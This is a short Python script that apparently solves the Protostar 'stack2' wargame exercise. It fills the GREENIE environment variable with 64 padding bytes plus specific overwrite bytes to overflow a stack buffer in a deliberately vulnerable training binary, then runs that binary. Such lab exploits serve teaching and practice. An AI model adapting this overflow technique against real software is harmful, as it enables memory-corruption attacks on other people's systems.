import os

GREENIE="A"*64 + "\x0a\x0d\x0a\x0d"
os.environ["GREENIE"] = GREENIE
os.system("/opt/protostar/bin/stack2")
